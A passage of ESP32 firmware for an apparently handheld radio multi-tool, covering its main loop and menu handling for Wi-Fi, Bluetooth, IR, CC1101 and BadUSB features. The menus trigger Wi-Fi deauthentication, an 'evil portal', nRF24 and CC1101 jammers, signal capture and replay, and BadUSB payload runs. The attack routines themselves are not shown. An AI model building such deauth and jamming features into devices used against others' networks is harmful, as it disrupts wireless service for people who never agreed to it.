  Serial.print(ESP.getFreeHeap() / 1024);
  Serial.println(" KB");
  Serial.print("Uptime: ");
  Serial.print(millis() / 1000);
  Serial.println(" sec");
  Serial.print("nRF24: ");
  if (nrfOk) Serial.println("OK");
  else Serial.println("ERROR - not found");
  Serial.print("CC1101: ");
  if (cc1101_ok) Serial.println("OK");
  else Serial.println("ERROR - not found");
  Serial.print("IR receiver: ");
  if (irRxOk) Serial.println("OK");
  else Serial.println("ERROR");
  Serial.print("IR transmitter: ");
  if (irTx != nullptr) Serial.println("OK");
  else Serial.println("ERROR");
  Serial.print("SD card: ");
  if (SD.begin(SD_CS_PIN, SPI, 4000000)) {
    uint8_t cardType = SD.cardType();
    uint64_t cardSize = SD.cardSize() / (1024 * 1024);
    Serial.print("OK, type: ");
    if (cardType == CARD_MMC) Serial.print("MMC");
    else if (cardType == CARD_SD) Serial.print("SDSC");
    else if (cardType == CARD_SDHC) Serial.print("SDHC");
    else Serial.print("Unknown");
    Serial.print(", size: ");
    Serial.print(cardSize);
    Serial.println(" MB");
  } else {
    Serial.println("ERROR - not found or init failed");
  }
  Serial.print("OLED display: ");
  Serial.println("OK");
  Serial.println("===================================\n");
}

// ==================== LOOP ====================
void loop() {
  handleButtons();
  bool up = btnUp();
  bool down = btnDown();
  bool ok = btnOk() && !longPressDetected;
  static bool lastUp = false, lastDown = false, lastOk = false;
  if (up && !lastUp) debugButton("UP");
  if (down && !lastDown) debugButton("DOWN");
  if (ok && !lastOk) debugButton("OK");
  lastUp = up; lastDown = down; lastOk = ok;

  static bool lastResetState = HIGH;
  static unsigned long resetPressStart = 0;
  static bool resetLongPressTriggered = false;
  bool resetState = digitalRead(1);
  if (resetState == LOW && lastResetState == HIGH) {
    resetPressStart = millis();
    resetLongPressTriggered = false;
  } else if (resetState == LOW && !resetLongPressTriggered && (millis() - resetPressStart) >= 5000) {
    resetLongPressTriggered = true;
    appState = STATE_CONFIRM_FACTORY_RESET;
    needRedraw = true;
  } else if (resetState == HIGH && lastResetState == LOW && !resetLongPressTriggered && (millis() - resetPressStart) < 5000) {
    ESP.restart();
  }
  lastResetState = resetState;

  if (!displayOn && (up || down || ok)) {
    setPower(true);
    lastActivityTime = millis();
    needRedraw = true;
    delay(100);
    up = false; down = false; ok = false;
  }
  if ((up || down || ok) && displayOn) {
    lastActivityTime = millis();
    needRedraw = true;
  }

  // Автоподключение к WiFi
  if (autoConnectScheduled && millis() >= autoConnectTime) {
    autoConnectScheduled = false;
    Serial.println("Auto-connect timer triggered");
    loadWiFiCredentials();
    if (savedNetworksCount > 0) {
      bool connectedToSaved = false;
      if (WiFi.status() == WL_CONNECTED) {
        String currentSSID = WiFi.SSID();
        for (int i = 0; i < savedNetworksCount; i++) {
          if (currentSSID == savedSSID[i]) { connectedToSaved = true; break; }
        }
      }
      if (!connectedToSaved) attemptAutoConnect();
      else Serial.println("Already connected to a saved network");
    } else Serial.println("No saved networks");
  }

  // Обработка подключения к WiFi
  if (appState == STATE_WIFI_CONNECTING) {
    if (connectInProgress) {
      if (WiFi.status() == WL_CONNECTED) {
        connectInProgress = false;
        lastConnectedSSID = connectSsid;
        lastConnectedPassword = connectPassword;
        showMsg("Connected to Wi-Fi");
        delay(2000);
        appState = STATE_WIFI_ACTIONS;
        needRedraw = true;
      } else if (millis() - connectStartTime > WIFI_CONNECT_TIMEOUT_MS) {
        connectInProgress = false;
        showMsg("Connection failed");
        delay(2000);
        appState = STATE_WIFI_ACTIONS;
        needRedraw = true;
      } else if (needRedraw && displayOn) drawWifiConnecting();
    } else if (ok) {
      appState = STATE_WIFI_ACTIONS;
      needRedraw = true;
      delay(200);
    }
    if (needRedraw && displayOn) updateDisplay();
    delay(5);
    return;
  }

  isCharging = digitalRead(CHARGE_PIN) == HIGH;

  // WiFi чат
  if (appState == STATE_WIFI_CHAT && !chatActive && WiFi.status() == WL_CONNECTED) {
    startWiFiChat();
    chatKeyboardActive = false;
    webSocketConnected = false;
  }
  if (appState != STATE_WIFI_CHAT && chatActive) {
    stopWiFiChat();
    chatKeyboardActive = false;
    webSocketConnected = false;
  }

  if (appState == STATE_WIFI_CHAT && chatActive) {
    server.handleClient();
    webSocket.loop();
    static unsigned long longPressStart = 0;
    static bool longPressFlag = false;
    if (confirmExit) {
      display.fillRect(20, 25, 88, 30, SSD1306_BLACK);
      display.drawRect(20, 25, 88, 30, SSD1306_WHITE);
      display.setCursor(25, 33);
      display.print("Exit chat?");
      display.setCursor(25, 43);
      display.print("UP=Yes  DOWN=No");
      display.display();
      if (up) {
        appState = STATE_WIFI_MENU;
        needRedraw = true;
        confirmExit = false;
        chatKeyboardActive = false;
        stopWiFiChat();
        delay(200);
      } else if (down) {
        confirmExit = false;
        needRedraw = true;
        delay(200);
      }
      return;
    }
    if (!chatKeyboardActive) {
      if (ok) {
        if (!longPressFlag) {
          longPressStart = millis();
          longPressFlag = true;
        } else if (millis() - longPressStart >= LONG_PRESS_MS) {
          confirmExit = true;
          needRedraw = true;
          longPressFlag = false;
        }
      } else {
        if (longPressFlag && millis() - longPressStart < LONG_PRESS_MS) {
          chatKeyboardActive = true;
          selectedKey = 0;
          capsLock = false;
          chatMessage = "";
          needRedraw = true;
        }
        longPressFlag = false;
      }
    } else {
      static unsigned long lastMoveTime = 0;
      static bool leftHeld = false, rightHeld = false;
      static bool okProcessed = false;
      if (up) {
        if (!leftHeld) {
          leftHeld = true; lastMoveTime = millis();
          selectedKey = (selectedKey - 1 + totalKeys) % totalKeys;
          needRedraw = true;
        } else if (millis() - lastMoveTime > CONSOLE_AUTOREPEAT_DELAY) {
          lastMoveTime = millis();
          selectedKey = (selectedKey - 1 + totalKeys) % totalKeys;
          needRedraw = true;
        }
      } else leftHeld = false;
      if (down) {
        if (!rightHeld) {
          rightHeld = true; lastMoveTime = millis();
          selectedKey = (selectedKey + 1) % totalKeys;
          needRedraw = true;
        } else if (millis() - lastMoveTime > CONSOLE_AUTOREPEAT_DELAY) {
          lastMoveTime = millis();
          selectedKey = (selectedKey + 1) % totalKeys;
          needRedraw = true;
        }
      } else rightHeld = false;
      if (ok && !okProcessed) {
        okProcessed = true;
        String key = capsLock ? upperKeys[selectedKey] : lowerKeys[selectedKey];
        if (key == "Caps") {
          capsLock = !capsLock;
          needRedraw = true;
        } else if (key == "Del") {
          if (chatMessage.length() > 0) chatMessage.remove(chatMessage.length() - 1);
          needRedraw = true;
        } else if (key == "OK") {
          if (chatMessage.length() > 0) {
            if (webSocket.connectedClients() > 0) {
              webSocket.broadcastTXT(chatMessage);
              Serial.print("Chat send: ");
              Serial.println(chatMessage);
              chatMessage = "";
              needRedraw = true;
            } else showMsg("No WebSocket client!");
          }
        } else if (key == "Exit") {
          confirmExit = true;
          needRedraw = true;
        } else if (key == "Space") {
          chatMessage += " ";
          needRedraw = true;
        } else if (key.length() > 0 && key != "Caps" && key != "Del" && key != "OK" && key != "Exit") {
          if (chatMessage.length() < 240) {
            chatMessage += key;
            needRedraw = true;
          } else showMsg("Msg too long");
        }
        delay(150);
      }
      if (!ok) okProcessed = false;
    }
    if (needRedraw && displayOn) updateDisplay();
    delay(5);
    return;
  }

  // Обновление батареи
  if (millis() - lastBatteryUpdate >= 1000) {
    float used = estimatedCurrentMA / 3600.0;
    batteryRemaining -= used;
    if (batteryRemaining < 0) batteryRemaining = 0;
    lastBatteryUpdate = millis();
    needRedraw = true;
    pref.begin("battery", false);
    pref.putFloat("remaining", batteryRemaining);
    pref.end();
  }

  // ============================================================
  // НОВАЯ ОБРАБОТКА СОСТОЯНИЙ ДЛЯ ИГР И КАЛЬКУЛЯТОРА
  // ============================================================
  if (appState == STATE_APPS_GAME1 || appState == STATE_APPS_GAME2 || appState == STATE_APPS_CALCULATOR) {
if (appState == STATE_APPS_CALCULATOR) {
  static unsigned long lastCalcMove = 0;
  static bool moveHeld = false;
  
  if (btnUp()) {
    if (!moveHeld) {
      calcSelectedKey = (calcSelectedKey - 1 + calcKeysCount) % calcKeysCount;
      needRedraw = true;
      moveHeld = true;
      lastCalcMove = millis();
    } else if (millis() - lastCalcMove > 200) {
      calcSelectedKey = (calcSelectedKey - 1 + calcKeysCount) % calcKeysCount;
      needRedraw = true;
      lastCalcMove = millis();
    }
  } else {
    moveHeld = false;
  }
  
  if (btnDown()) {
    if (!moveHeld) {
      calcSelectedKey = (calcSelectedKey + 1) % calcKeysCount;
      needRedraw = true;
      moveHeld = true;
      lastCalcMove = millis();
    } else if (millis() - lastCalcMove > 200) {
      calcSelectedKey = (calcSelectedKey + 1) % calcKeysCount;
      needRedraw = true;
      lastCalcMove = millis();
    }
  } else {
    moveHeld = false;
  }
  
  if (btnOk()) {
    String key = calcKeyLabels[calcSelectedKey];
    if (key == "=") {
      calcResult = evaluateExpression(calcExpression);
      needRedraw = true;
    } else if (key == "C") {
      calcExpression = "";
      calcResult = "";
      needRedraw = true;
    } else if (key == "Del") {
      if (calcExpression.length() > 0) calcExpression.remove(calcExpression.length()-1);
      needRedraw = true;
    } else if (key == "Exit") {
      appState = STATE_APPS_MENU;
      needRedraw = true;
    } else {
      calcExpression += key;
      needRedraw = true;
    }
    delay(150);
  }
}
    if (needRedraw && displayOn) updateDisplay();
    delay(5);
    return;
  }

  // ============================================================
  // ОБЩАЯ ОБРАБОТКА КНОПОК ДЛЯ ОСТАЛЬНЫХ СОСТОЯНИЙ (МЕНЮ)
  // ============================================================
  if (appState != STATE_CONSOLE && appState != STATE_CONSOLE_COMMAND_OUTPUT) {
    // Обработка нажатий для всех меню (кроме консоли и игр)
    if (up) {
      switch (appState) {
        // ---- Главное меню ----
        case STATE_MAIN_MENU:
          mainIdx--;
          if (mainIdx < 0) mainIdx = MAIN_SIZE_TOTAL - 1;
          if (mainIdx < mainScrollOffset) mainScrollOffset = mainIdx;
          needRedraw = true;
          break;

        // ---- Меню Apps ----
        case STATE_APPS_MENU:
    appsMenuIdx--;
    if (appsMenuIdx < 0) appsMenuIdx = 4;
    needRedraw = true;
          break;

        // ---- Bluetooth ----
        case STATE_BLUETOOTH_SCAN:
          bleSelectedIdx--;
          if (bleSelectedIdx < 0) bleSelectedIdx = bleDevices.empty() ? 0 : bleDevices.size() - 1;
          needRedraw = true;
          break;
        case STATE_BLUETOOTH_MENU:
          bluetoothMenuIdx = (bluetoothMenuIdx - 1 + 2) % 2;
          needRedraw = true;
          break;

        // ---- LED ----
        case STATE_LED_SELECT_DEVICE:
          led_submenu_idx = (led_submenu_idx - 1 + 3) % 3;
          needRedraw = true;
          break;
        case STATE_LED_MAIN_MENU:
          led_submenu_idx = (led_submenu_idx - 1 + 5) % 5;
          needRedraw = true;
          break;
        case STATE_LED_COLOR_MENU:
          {
            int *colorIdx = led_selected_device ? &led_keyboard_colorIdx : &led_board_colorIdx;
            *colorIdx = (*colorIdx - 1 + numColors) % numColors;
            needRedraw = true;
          }
          break;
        case STATE_LED_EFFECT_MENU:
          {
            int *effect = led_selected_device ? &led_keyboard_effect : &led_board_effect;
            *effect = (*effect - 1 + numEffects) % numEffects;
            needRedraw = true;
          }
          break;
        case STATE_LED_BRIGHTNESS_MENU:
          {
            int *bright = led_selected_device ? &led_keyboard_brightness : &led_board_brightness;
            *bright = constrain(*bright + 5, 0, 100);
            needRedraw = true;
          }
          break;
        case STATE_LED_TIMEOUT_MENU:
          {
            int *timeout = led_selected_device ? &led_keyboard_timeout : &led_board_timeout;
            *timeout = (*timeout - 1 + 61) % 61;
            needRedraw = true;
          }
          break;

        // ---- WiFi ----
        case STATE_WIFI_MENU:
          wifiMenuIdx--;
          if (wifiMenuIdx < 0) wifiMenuIdx = WIFI_MENU_SIZE - 1;
          needRedraw = true;
          break;
        case STATE_WIFI_SCAN:
          wifiSelectedIdx--;
          if (wifiSelectedIdx < -1) wifiSelectedIdx = wifiList.size() - 1;
          needRedraw = true;
          break;
        case STATE_WIFI_ACTIONS:
          wifiActionIdx--;
          if (wifiActionIdx < 0) wifiActionIdx = WIFI_ACTIONS_SIZE - 1;
          needRedraw = true;
          break;

        // ---- nRF24 ----
        case STATE_NRF24_MENU:
          nrfMenuIdx--;
          if (nrfMenuIdx < 0) nrfMenuIdx = NRF_MENU_SIZE - 1;
          needRedraw = true;
          break;

        // ---- IR ----
        case STATE_IR_MENU:
          irMenuIdx--;
          if (irMenuIdx < 0) irMenuIdx = IR_MENU_SIZE - 1;
          needRedraw = true;
          break;
        case STATE_IR_TRANSMIT:
          irTxScroll--;
          if (irTxScroll < 0) irTxScroll = IR_SLOTS_COUNT;
          needRedraw = true;
          break;

        // ---- Settings ----
        case STATE_SETTINGS_MENU:
          settingsIdx--;
          if (settingsIdx < 0) settingsIdx = SETTINGS_SIZE - 1;
          needRedraw = true;
          break;
        case STATE_TIMEOUT:
          timeoutVal = timeoutVal - 1;
          if (timeoutVal < 0) timeoutVal = 300;
          needRedraw = true;
          break;

        // ---- CC1101 ----
        case STATE_CC1101_MENU:
          cc1101_menu_idx--;
          if (cc1101_menu_idx < 0) cc1101_menu_idx = 5;
          needRedraw = true;
          break;

        // ---- BadUSB ----
        case STATE_BADUSB_BUILTIN:
          badUsbBuiltinIdx--;
          if (badUsbBuiltinIdx < 0) badUsbBuiltinIdx = badUsbBuiltinCount;
          needRedraw = true;
          break;
        case STATE_BADUSB_SD:
          badUsbFileIdx--;
          if (badUsbFileIdx < 0) badUsbFileIdx = badUsbFileList.size();
          needRedraw = true;
          break;

        default: break;
      }
      delay(150);
    }

    if (down) {
      switch (appState) {
        case STATE_MAIN_MENU:
          mainIdx++;
          if (mainIdx >= MAIN_SIZE_TOTAL) mainIdx = 0;
          if (mainIdx >= mainScrollOffset + MAIN_VISIBLE) mainScrollOffset = mainIdx - MAIN_VISIBLE + 1;
          needRedraw = true;
          break;
        case STATE_APPS_MENU:
    appsMenuIdx++;
    if (appsMenuIdx > 4) appsMenuIdx = 0;
    needRedraw = true;
          break;
        case STATE_BLUETOOTH_SCAN:
          bleSelectedIdx++;
          if (bleSelectedIdx >= (int)bleDevices.size()) bleSelectedIdx = 0;
          needRedraw = true;
          break;
        case STATE_BLUETOOTH_MENU:
          bluetoothMenuIdx = (bluetoothMenuIdx + 1) % 2;
          needRedraw = true;
          break;
        case STATE_LED_SELECT_DEVICE:
          led_submenu_idx = (led_submenu_idx + 1) % 3;
          needRedraw = true;
          break;
        case STATE_LED_MAIN_MENU:
          led_submenu_idx = (led_submenu_idx + 1) % 5;
          needRedraw = true;
          break;
        case STATE_LED_COLOR_MENU:
          {
            int *colorIdx = led_selected_device ? &led_keyboard_colorIdx : &led_board_colorIdx;
            *colorIdx = (*colorIdx + 1) % numColors;
            needRedraw = true;
          }
          break;
        case STATE_LED_EFFECT_MENU:
          {
            int *effect = led_selected_device ? &led_keyboard_effect : &led_board_effect;
            *effect = (*effect + 1) % numEffects;
            needRedraw = true;
          }
          break;
        case STATE_LED_BRIGHTNESS_MENU:
          {
            int *bright = led_selected_device ? &led_keyboard_brightness : &led_board_brightness;
            *bright = constrain(*bright - 5, 0, 100);
            needRedraw = true;
          }
          break;
        case STATE_LED_TIMEOUT_MENU:
          {
            int *timeout = led_selected_device ? &led_keyboard_timeout : &led_board_timeout;
            *timeout = (*timeout + 1) % 61;
            needRedraw = true;
          }
          break;
        case STATE_WIFI_MENU:
          wifiMenuIdx++;
          if (wifiMenuIdx >= WIFI_MENU_SIZE) wifiMenuIdx = 0;
          needRedraw = true;
          break;
        case STATE_WIFI_SCAN:
          wifiSelectedIdx++;
          if (wifiSelectedIdx >= (int)wifiList.size()) wifiSelectedIdx = -1;
          needRedraw = true;
          break;
        case STATE_WIFI_ACTIONS:
          wifiActionIdx++;
          if (wifiActionIdx >= WIFI_ACTIONS_SIZE) wifiActionIdx = 0;
          needRedraw = true;
          break;
        case STATE_NRF24_MENU:
          nrfMenuIdx++;
          if (nrfMenuIdx >= NRF_MENU_SIZE) nrfMenuIdx = 0;
          needRedraw = true;
          break;
        case STATE_IR_MENU:
          irMenuIdx++;
          if (irMenuIdx >= IR_MENU_SIZE) irMenuIdx = 0;
          needRedraw = true;
          break;
        case STATE_IR_TRANSMIT:
          irTxScroll++;
          if (irTxScroll > IR_SLOTS_COUNT) irTxScroll = 0;
          needRedraw = true;
          break;
        case STATE_SETTINGS_MENU:
          settingsIdx++;
          if (settingsIdx >= SETTINGS_SIZE) settingsIdx = 0;
          needRedraw = true;
          break;
        case STATE_TIMEOUT:
          timeoutVal = timeoutVal + 1;
          if (timeoutVal > 300) timeoutVal = 0;
          needRedraw = true;
          break;
        case STATE_CC1101_MENU:
          cc1101_menu_idx++;
          if (cc1101_menu_idx > 5) cc1101_menu_idx = 0;
          needRedraw = true;
          break;
        case STATE_BADUSB_BUILTIN:
          badUsbBuiltinIdx++;
          if (badUsbBuiltinIdx > badUsbBuiltinCount) badUsbBuiltinIdx = 0;
          needRedraw = true;
          break;
        case STATE_BADUSB_SD:
          badUsbFileIdx++;
          if (badUsbFileIdx > (int)badUsbFileList.size()) badUsbFileIdx = 0;
          needRedraw = true;
          break;
        default: break;
      }
      delay(150);
    }

    if (ok) {
      switch (appState) {
        case STATE_MAIN_MENU:
          // Порядок пунктов: WiFi, Bluetooth, nRF24, IR, Console, BadUSB, Settings, CC1101, Storage, Apps
          switch (mainIdx) {
            case 0: appState = STATE_WIFI_MENU; wifiMenuIdx = 0; break;
            case 1: appState = STATE_BLUETOOTH_MENU; bluetoothMenuIdx = 0; break;
            case 2: appState = STATE_NRF24_MENU; nrfMenuIdx = 0; break;
            case 3: appState = STATE_IR_MENU; irMenuIdx = 0; break;
            case 4: appState = STATE_CONSOLE; consoleMode = CONSOLE_KEYBOARD; selectedKey = 0; capsLock = false; consoleText = ""; drawKeyboard(); break;
            case 5: appState = STATE_BADUSB_MENU; badUsbMenuIdx = 0; break;
            case 6: appState = STATE_SETTINGS_MENU; settingsIdx = 0; break;
            case 7: appState = STATE_CC1101_MENU; cc1101_menu_idx = 0; break;
            case 8: appState = STATE_STORAGE_INFO; break;   // Storage (бывший Search)
            case 9: appState = STATE_APPS_MENU; appsMenuIdx = 0; break; // Apps
          }
          needRedraw = true;
          break;

        case STATE_APPS_MENU:
    switch (appsMenuIdx) {
      case 0: appState = STATE_APPS_CALCULATOR; break;
      case 1: appState = STATE_APPS_GAME1; break;
      case 2: appState = STATE_APPS_GAME2; break;
      case 3: runWikipedia(); break;
      case 4: appState = STATE_MAIN_MENU; break;
    }
    needRedraw = true;
          break;

        // ---- Bluetooth ----
        case STATE_BLUETOOTH_SCAN:
          if (bleSelectedIdx == (int)bleDevices.size()) {
            appState = STATE_BLUETOOTH_MENU;
            bluetoothMenuIdx = 0;
          } else {
            showMsg("Device selected");
          }
          needRedraw = true;
          break;
        case STATE_BLUETOOTH_MENU:
          if (bluetoothMenuIdx == 0) {
            performBleScan();
            appState = STATE_BLUETOOTH_SCAN;
          } else {
            appState = STATE_MAIN_MENU;
          }
          needRedraw = true;
          break;

        // ---- BadUSB ----
        case STATE_BADUSB_MENU:
          if (badUsbMenuIdx == 0) {
            appState = STATE_BADUSB_BUILTIN;
            badUsbBuiltinIdx = 0;
          } else if (badUsbMenuIdx == 1) {
            badUsbFileList.clear();
            badUsbFileIdx = 0;
            appState = STATE_BADUSB_SD;
          } else {
            appState = STATE_MAIN_MENU;
          }
          needRedraw = true;
          break;
        case STATE_BADUSB_BUILTIN:
          if (badUsbBuiltinIdx == badUsbBuiltinCount) {
            appState = STATE_BADUSB_MENU;
          } else {
            badUsbRunBuiltin(badUsbBuiltinIdx);
          }
          needRedraw = true;
          break;
        case STATE_BADUSB_SD:
          if (badUsbFileIdx == (int)badUsbFileList.size()) {
            appState = STATE_BADUSB_MENU;
          } else if (!badUsbFileList.empty()) {
            badUsbRunFile(badUsbFileList[badUsbFileIdx]);
          }
          needRedraw = true;
          break;

        // ---- LED ----
        case STATE_LED_SELECT_DEVICE:
          if (led_submenu_idx == 0) led_selected_device = 0;
          else if (led_submenu_idx == 1) led_selected_device = 1;
          else { appState = STATE_SETTINGS_MENU; break; }
          appState = STATE_LED_MAIN_MENU;
          led_submenu_idx = 0;
          needRedraw = true;
          break;
        case STATE_LED_MAIN_MENU:
          if (led_submenu_idx == 0) appState = STATE_LED_COLOR_MENU;
          else if (led_submenu_idx == 1) appState = STATE_LED_EFFECT_MENU;
          else if (led_submenu_idx == 2) appState = STATE_LED_BRIGHTNESS_MENU;
          else if (led_submenu_idx == 3) appState = STATE_LED_TIMEOUT_MENU;
          else appState = STATE_LED_SELECT_DEVICE;
          needRedraw = true;
          break;
        case STATE_LED_COLOR_MENU:
          saveLedSettings();
          appState = STATE_LED_MAIN_MENU;
          needRedraw = true;
          break;
        case STATE_LED_EFFECT_MENU:
          saveLedSettings();
          appState = STATE_LED_MAIN_MENU;
          needRedraw = true;
          break;
        case STATE_LED_BRIGHTNESS_MENU:
          saveLedSettings();
          appState = STATE_LED_MAIN_MENU;
          needRedraw = true;
          break;
        case STATE_LED_TIMEOUT_MENU:
          saveLedSettings();
          appState = STATE_LED_MAIN_MENU;
          needRedraw = true;
          break;

        // ---- Storage ----
        case STATE_STORAGE_INFO:
          appState = STATE_MAIN_MENU;
          needRedraw = true;
          break;

        // ---- WiFi ----
        case STATE_WIFI_MENU:
          switch (wifiMenuIdx) {
            case 0: startWifiScan(); appState = STATE_WIFI_SCAN; break;
            case 1: appState = STATE_WIFI_SPECTRUM; wifiSpectrumActive = true; break;
            case 2: appState = STATE_WIFI_CHAT; break;
            case 3: runDeauther(); break;
            case 4: runEvilPortal(); break;
            case 5: appState = STATE_MAIN_MENU; break;
          }
          needRedraw = true;
          break;
        case STATE_WIFI_SCAN:
          if (wifiSelectedIdx == -1) {
            appState = STATE_WIFI_MENU;
          } else if (wifiSelectedIdx >= 0 && wifiSelectedIdx < (int)wifiList.size()) {
            appState = STATE_WIFI_ACTIONS;
            wifiActionIdx = 0;
          }
          needRedraw = true;
          break;
        case STATE_WIFI_SPECTRUM:
          appState = STATE_WIFI_MENU;
          wifiSpectrumActive = false;
          needRedraw = true;
          break;
        case STATE_WIFI_ACTIONS:
          switch (wifiActionIdx) {
            case 0:
              if (wifiList.size() > 0 && wifiSelectedIdx >= 0) appState = STATE_WIFI_INFO;
              else showMsg("No network selected");
              break;
            case 1:
              if (wifiList.size() > 0 && wifiSelectedIdx >= 0) {
                deauthActive = !deauthActive;
                if (deauthActive) showMsg("Deauth started");
                else showMsg("Deauth stopped");
              } else showMsg("Select network first");
              break;
            case 2:
              deauthActive = false;
              showMsg("Deauth stopped");
              break;
            case 3:
              if (wifiSelectedIdx >= 0 && wifiSelectedIdx < (int)wifiList.size()) {
                String ssid = wifiList[wifiSelectedIdx].ssid;
                String password = "";
                bool found = false;
                for (int i = 0; i < savedNetworksCount; i++) {
                  if (savedSSID[i] == ssid) {
                    password = savedPassword[i];
                    found = true;
                    break;
                  }
                }
                if (!found) {
                  password = inputStringWithKeyboard(true, "Enter password:");
                }
                if (password.length() > 0) {
                  connectSsid = ssid;
                  connectPassword = password;
                  connectInProgress = true;
                  connectStartTime = millis();
                  WiFi.begin(ssid.c_str(), password.c_str());
                  appState = STATE_WIFI_CONNECTING;
                }
              } else showMsg("Select network first");
              break;
            case 4:
              if (wifiSelectedIdx >= 0 && wifiSelectedIdx < (int)wifiList.size()) {
                String ssid = wifiList[wifiSelectedIdx].ssid;
                String password = inputStringWithKeyboard(true, "Enter password:");
                if (password.length() > 0) {
                  saveWiFiCredentials(ssid, password);
                  showMsg("Saved");
                }
              } else showMsg("Select network first");
              break;
            case 5:
              disconnectWiFi();
              break;
            case 6:
              appState = STATE_WIFI_MENU;
              break;
          }
          needRedraw = true;
          break;
        case STATE_WIFI_INFO:
          appState = STATE_WIFI_SCAN;
          needRedraw = true;
          break;

        // ---- nRF24 ----
        case STATE_NRF24_MENU:
          switch (nrfMenuIdx) {
            case 0: appState = STATE_NRF24_SPECTRUM; break;
            case 1: runNrfEnhancedJammer(); break;
            case 2: recheckNRF24(); appState = STATE_NRF24_MENU; break;
            case 3: appState = STATE_MAIN_MENU; break;
          }
          needRedraw = true;
          break;
        case STATE_NRF24_SPECTRUM:
          appState = STATE_NRF24_MENU;
          needRedraw = true;
          break;

        // ---- IR ----
        case STATE_IR_MENU:
          switch (irMenuIdx) {
            case 0:
              irCapturing = true;
              irTempReady = false;
              irTimeout = millis() + 10000;
              appState = STATE_IR_CAPTURE;
              break;
            case 1:
              irTxScroll = 0;
              appState = STATE_IR_TRANSMIT;
              break;
            case 2:
              eraseAllIrSlots();
              needRedraw = true;
              break;
            case 3:
              tvbgone_menu();
              break;
            case 4:
              appState = STATE_MAIN_MENU;
              break;
          }
          needRedraw = true;
          break;
        case STATE_IR_CAPTURE:
          if (irTempReady) {
            irSlots[curIrSlot].isValid = true;
            irSlots[curIrSlot].rawLength = tempRawLen;
            for (int i = 0; i < tempRawLen; i++) irSlots[curIrSlot].rawBuffer[i] = tempRaw[i];
            saveIrSlots();
            showMsg("IR captured");
          }
          irCapturing = false;
          appState = STATE_IR_MENU;
          needRedraw = true;
          break;
        case STATE_IR_TRANSMIT:
          if (irTxScroll == IR_SLOTS_COUNT) appState = STATE_IR_MENU;
          else { sendIr(irTxScroll); showMsg("Sent"); }
          needRedraw = true;
          break;

        // ---- Settings ----
        case STATE_SETTINGS_MENU:
          switch (settingsIdx) {
            case 0: appState = STATE_SYSTEM_INFO; break;
            case 1: appState = STATE_TIMEOUT; break;
            case 2: appState = STATE_LED_SELECT_DEVICE; led_submenu_idx = 0; break;
            case 3: appState = STATE_RESET_CONFIRM; break;
            case 4: appState = STATE_REBOOT_CONFIRM; break;
            case 5: appState = STATE_MAIN_MENU; break;
          }
          needRedraw = true;
          break;
        case STATE_SYSTEM_INFO:
          appState = STATE_SETTINGS_MENU;
          needRedraw = true;
          break;
        case STATE_TIMEOUT:
          displayTimeoutSec = timeoutVal;
          saveTimeout();
          appState = STATE_SETTINGS_MENU;
          needRedraw = true;
          break;
        case STATE_RESET_CONFIRM:
          // обрабатывается отдельно ниже
          break;
        case STATE_REBOOT_CONFIRM:
          // обрабатывается отдельно ниже
          break;
        case STATE_CONFIRM_FACTORY_RESET:
          // обрабатывается отдельно ниже
          break;

        // ---- CC1101 ----
        case STATE_CC1101_MENU:
          switch (cc1101_menu_idx) {
            case 0: appState = STATE_CC1101_SPECTRUM_VERT; break;
            case 1: appState = STATE_CC1101_SPECTRUM_HORIZ; break;
            case 2: appState = STATE_CC1101_JAMMER; break;
            case 3: appState = STATE_CC1101_CAPTURE; break;
            case 4: appState = STATE_CC1101_TRANSMIT; break;
            case 5: appState = STATE_MAIN_MENU; break;
          }
          needRedraw = true;
          break;
        case STATE_CC1101_SPECTRUM_VERT:
          appState = STATE_CC1101_MENU;
          needRedraw = true;
          break;
        case STATE_CC1101_SPECTRUM_HORIZ:
          appState = STATE_CC1101_MENU;
          needRedraw = true;
          break;
        case STATE_CC1101_JAMMER:
          if (cc1101_jamming) stopCc1101Jammer();
          else startCc1101Jammer();
          needRedraw = true;
          break;
        case STATE_CC1101_CAPTURE:
          if (cc1101_capturing) cc1101_capture_stop();
          else cc1101_capture_start();
          needRedraw = true;
          break;
        case STATE_CC1101_TRANSMIT:
          if (cc1101_transmitting) cc1101_transmit_stop();
          else cc1101_transmit_start();
          needRedraw = true;
          break;

        default: break;
      }
      delay(200);
    }
  }

  // ============================================================
  // ФОНОВЫЕ ЗАДАЧИ (спектры, джеммеры, IR, CC1101)
  // ============================================================
  if (displayOn && displayTimeoutSec > 0 && (millis() - lastActivityTime) > (displayTimeoutSec * 1000UL)) setPower(false);

  if (appState == STATE_WIFI_SPECTRUM && wifiSpectrumActive) updateWifiSpectrum();
  if (appState == STATE_NRF24_SPECTRUM && nrfOk) updateNrfSpectrum();
  if (appState == STATE_NRF24_JAMMER && jamming && nrfOk && millis() - lastJamTime > JAM_INTERVAL_MS) updateJammer();
  if (deauthActive && targetChan != 0 && millis() - lastDeauthTime > 100) {
    sendDeauth();
    lastDeauthTime = millis();
    if (appState == STATE_DEAUTHER) deauthPacketCount++;
  }
  if (appState == STATE_IR_CAPTURE && irCapturing) processIrCapture();

  if (cc1101_ok) {
    if (appState == STATE_CC1101_SPECTRUM_VERT || appState == STATE_CC1101_SPECTRUM_HORIZ) updateCc1101Spectrum();
    if (appState == STATE_CC1101_JAMMER && cc1101_jamming) updateCc1101Jammer();
    if (appState == STATE_CC1101_TRANSMIT && cc1101_transmitting) cc1101_transmit_loop();
    if (cc1101_capturing) {
      if (ELECHOUSE_cc1101.CheckRxFifo(0)) {
        byte buf[64];
        byte len = ELECHOUSE_cc1101.ReceiveData(buf);
        if (len > 0 && cc1101_capture_len + len < CC1101_CAPTURE_MAX) {
          memcpy(cc1101_capture_buffer + cc1101_capture_len, buf, len);
          cc1101_capture_len += len;
        } else if (cc1101_capture_len + len >= CC1101_CAPTURE_MAX) {
          cc1101_capture_stop();
          showMsg("Capture buffer full");
        }
      }
      if (millis() - cc1101_capture_start_time > 10000) {
        cc1101_capture_stop();
        showMsg("Capture timeout");
      }
    }
  }

  // ============================================================
  // ОБРАБОТКА ПОДТВЕРЖДЕНИЙ (RESET, REBOOT, FACTORY RESET)
  // ============================================================
  if (appState == STATE_RESET_CONFIRM) {
    if (up) {
      clearAllPreferences();
      showMsg("Reset done");
      delay(2000);
      ESP.restart();
    } else if (down) {
      appState = STATE_SETTINGS_MENU;
      needRedraw = true;
    }
  }
  if (appState == STATE_REBOOT_CONFIRM) {
    if (up) {
      showMsg("Rebooting...");
      delay(1000);
      ESP.restart();
    } else if (down) {
      appState = STATE_SETTINGS_MENU;
      needRedraw = true;
    }
  }
  if (appState == STATE_CONFIRM_FACTORY_RESET) {
    if (up) {
      clearAllPreferences();
